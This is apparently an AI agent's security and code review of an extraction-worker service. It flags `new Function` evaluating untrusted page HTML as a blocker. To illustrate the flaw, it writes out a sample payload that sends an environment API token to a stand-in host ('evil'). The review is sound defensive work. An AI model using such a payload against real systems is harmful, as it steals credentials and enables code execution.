I now have all the evidence needed. Let me compile the review.

## Review

### Correct (with evidence)

- **Architecture invariants hold.** No SQLite/DB/repository imports anywhere under `src/extraction-worker/` (grep for `bun:sqlite|getDb|repositories` returned nothing). The trusted extract path (`extract.ts:21-31`) imports only `node:http`, `playwright`, `cheerio`, and Zod schemas — no `openai`/`callLlm`/`stagehand`. The only `stagehand` references are the boolean capability flag in `health.ts`. ✅ Worker never touches SQLite; no LLM in trusted extraction.
- **All outputs validated through Zod.** Each route calls its response schema's `.parse()` before responding (`snapshot.ts` `buildSnapshotResponse`; `validate.ts:~560` `ValidateResponseSchema.parse`; `extract.ts` `ExtractResponseSchema.parse`). Fallback error paths also parse. ✅
- **Trusted extraction fails closed.** `extract.ts` returns `ok:false` when title is absent (`if (!title) { ...return buildFailedResult }` in both static and rendered paths; `ok = data.title !== null && data.title.length > 0`). Expected price override is gated on truthiness with provenance `'spreadsheet-import'`. ✅
- **Auth applied to every route.** `server.ts` `route()` calls `checkAuth(req)` before dispatching to any handler, including `/health`. No route skips it. Worker binds `127.0.0.1` (`server.ts:31`). ✅
- **Client is fail-closed.** `extraction-worker-client.ts` `workerFetch` returns `{ok:false,error}` on timeout/network/Zod error rather than throwing; `getWorkerHealth` returns `null` on failure. ✅
- **Type safety clean.** `npx tsc --noEmit --skipLibCheck` produced zero errors.
- **Artifacts git-ignored.** `.gitignore` covers `.shopsite-cms/`; artifacts write under `.shopsite-cms/artifacts/profile-builder/...` (`artifacts.ts`). ✅
- **Bun health route added correctly.** `onboarding-routes.ts:1092` `GET /onboarding/settings/extraction-worker/health` proxies `getWorkerHealth()` and returns a safe degraded shape (`{ok:false, capabilities:..., version:'unavailable'}`) without leaking the worker host/token. It's a GET, consistent with the app's GET-exempt API-token convention (`app.ts:26-31`). ✅
- **Error handling in route handlers.** Every POST handler wraps the `req.on('end', async ...)` body in `try/catch` returning a schema-valid fallback on 500, and attaches `req.on('error')`. No uncaught throw in the hot path. ✅

### Blocker

- **Arbitrary code execution from untrusted page content via `new Function`** — `snapshot.ts:154`:
  ```js
  const obj = new Function(`return (${html.substring(braceStart, braceEnd + 1)})`)();
  ```
  This evaluates a substring of **untrusted fetched HTML** as JavaScript in the worker's Node.js process. The object-literal content is fully attacker-controlled (it comes from a brand product page). Computed property keys execute during construction, e.g. `{ [(0,eval)('…arbitrary…')]: 1 }` or `{ [(()=>{ fetch('http://evil/?'+process.env.SHOPSITE_CMS_API_TOKEN) })()]: 1 }`. The worker's `process.env` contains `SHOPSITE_CMS_API_TOKEN` and `SHOPSITE_CMS_WORKER_TOKEN` (dev.ts spreads `...process.env` into the worker env, and the worker also has filesystem write access for artifacts). This directly violates the plan's mandate *"Treat all source-page content as untrusted data"* and the AGENTS.md security mandates. The inline comment claims this is "a safer eval" — it is not. **Fix:** use `JSON.parse` only and skip non-JSON blocks (as the rendered/Playwright path already does safely via `window.productJSON`), or use a sandboxed `vm`. This is reachable from the static snapshot runtime, which is the default-able path.

### Notes (observations / risks / follow-ups)

- **Auth disabled when token is unset** (`auth.ts:38-46`): when `SHOPSITE_CMS_WORKER_TOKEN` is absent, *all* requests are authorized. This matches the Phase-2 plan detail ("optional, warns when unset") but contradicts the plan's *Security rules* section ("Require `Authorization: Bearer <worker token>` for every request"). In production an unset token = fully open worker bound to loopback. Recommend fail-closed (reject if no token configured) for non-dev.
- **Timing-unsafe token comparison** (`auth.ts:55` `providedToken !== token`): susceptible to timing side-channels. Low risk on loopback, but prefer `crypto.timingSafeEqual`.
- **Client calls unimplemented worker endpoints.** `extraction-worker-client.ts` exposes `submitWorkerJob`/`getWorkerJobStatus` (`/jobs`, `/jobs/:id`) and `proposeProfile` (`/profile-tooling/propose`), but `server.ts` registers no such routes → those calls hit the 404 handler. No caller invokes them yet (grep confirmed only `getWorkerHealth` is used), so non-breaking, but invoking them would fail. They are forward-contract methods for Phases 6+.
- **Potential unhandled rejection** in all three Playwright paths: `Promise.race([browser.close(), new Promise(resolve => setTimeout(resolve, 2000))])` — if `browser.close()` rejects *after* the 2s timeout wins the race, the rejection is unobserved (the surrounding `try/catch` has already completed). Edge case (browser crash/hang).
- **Double `browser.close()`** in `extract.ts` rendered path: the early `await browser.close(); return buildFailedResult(...)` inside `try` is followed by the `finally` closing again. Harmless (caught) but sloppy.
- **Dead code:** `makePlaywrightImageCollector()` in `extract.ts` is defined but never used — the rendered image collection uses an inline IIFE string instead.
- **`validate.ts` regex selector matching** (`extractTextBySelector`) cannot correctly handle nested same-tag elements (non-greedy `[\s\S]*?` matches the innermost close tag). Acceptable for validation *diagnostics*; the trusted `extract.ts` correctly uses Cheerio (`$(sel).first().text()`) and Playwright `querySelector`, so trusted extraction is unaffected.
- **`validate.ts` summary gap:** a sample whose fetch failed (empty `fieldResults`) is counted as neither passing nor failing, so `sampleCount ≠ passingSamples + failingSamples`. Callers should not assume the two sum to the total.
- **No request body size limit** on worker POST handlers (`chunks.push(c)` buffers unbounded). Low risk (auth-gated, local) but a memory-exhaustion vector.
- **Invocation inconsistency:** `dev.ts` spawns the worker via `npx tsx`, while `package.json` `worker:dev` uses `node --import tsx`. Both work; pick one.
- **`package.json` `test` script** was expanded with many unrelated test files (profile-generation, sitemap, serper) — scope creep beyond the worker, though part of the broader branch. The worker-specific additions (`worker:dev`, `worker:start`) are correct.
- **No tests exist** for the extraction worker or its client (`find` for `**/extraction-worker/**/*.test.ts` returned nothing). Residual risk: the snapshot/validate/extract logic (JSON-LD parsing, selector extraction, word-overlap scoring, fail-closed title check) is untested.
- **Artifact refs** are returned as plain relative paths (e.g. `.shopsite-cms/artifacts/...`) rather than the `artifact://…` scheme in the plan's illustrative example. Acceptable; the plan only requires "artifact references."

### Commands run
- `npx tsc --noEmit --skipLibCheck` → **passed**, no output.
- `git status --porcelain` → worker files untracked; `git diff --cached --name-only` → empty (nothing staged).
- `git diff scripts/dev.ts package.json` → changes scoped to worker spawn + worker scripts (plus unrelated test-script expansion).
- Greps for DB/LLM imports, client-method callers, `new Function`, `.gitignore` coverage.